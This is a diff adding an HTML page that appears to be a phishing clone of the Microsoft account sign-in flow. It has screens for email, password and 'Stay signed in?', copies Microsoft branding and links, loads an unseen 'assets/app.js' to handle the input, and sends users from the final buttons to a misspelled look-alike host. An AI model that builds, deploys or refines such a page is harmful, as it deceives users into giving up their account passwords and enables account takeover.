@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
+</head>
+
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email or phone" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="https://signup.live.com/signup?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=DCC438F477FC16C4&opid=6E33C09E538EAF04&bk=1707999851&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26contextid%3dDCC438F477FC16C4%26opid%3d6E33C09E538EAF04%26mkt%3dFR-FR%26lc%3d1036%26bk%3d1707999851%26uaid%3d14a6a9cb65154fbbb3aa547016c078c4&uiflavor=web&lic=1&mkt=FR-FR&lc=1036&uaid=14a6a9cb65154fbbb3aa547016c078c4" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&client-request-id=14a6a9cb-6515-4fbb-b3aa-547016c078c4&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAA3MS7dCQAAA4P_StoXkei1aTIUxo7xOlJ0TBg0yxQy__rb_zrfpZsLavqlpmwckw8d1Ja2VS2n29IgPQ7132CzlsZAQ77RkbSDyV00CHKLyfhkMTIUuY0X_uffgyF4FuBpkrE-_svcxY4SiajaXDp223RYpkyerPqueb5_N-SkeTfVSyFshQAJnJCQNhI0Bx96O0LGqq9OchNYOpm5W0Bm_OQotrlKBBA0Kl_phmU2lmrzS7n57fl82kIJe-JAgbYwIPdsrRhZLOskO8qipX1r_8cz93YiwNBTVMgBNfcR6eZ0Ecb4kMpTl6Db8WvYPN4GtFcc8ZPki6_vbOCluzG7r6Nhg5_j7DyUVdfEZYD6t1HV-7YgvQ-bFqLbkP1Mk4eGw-Qc39XZTWgEAAA&msaoauth2=true&lc=1036&sso_nonce=AwABAAEAAAACAOz_BQD0_5ElW-OEiLuEpGMbWBRYG-XDkiYhi8VSlr-GugK8lf7DZyWheEAGQER15HbWnFS6AwCVzFpA4X05pzpC-4_ZOOMgAA&mscrid=14a6a9cb-6515-4fbb-b3aa-547016c078c4" class="link">Can't access your account?
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Next</button>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <a href="https://microsft.eror403/"><button class="btn btn-sec" id="btn_final">No</button></a>
+                <a href="https://microsft.eror403/"><button class="btn" id="btn_final">Yes</button></a>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="https://www.microsoft.com/fr/servicesagreement/">Terms of use</a>
+        <a href="https://privacy.microsoft.com/fr-fr/privacystatement">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
+</body>
+
+</html>
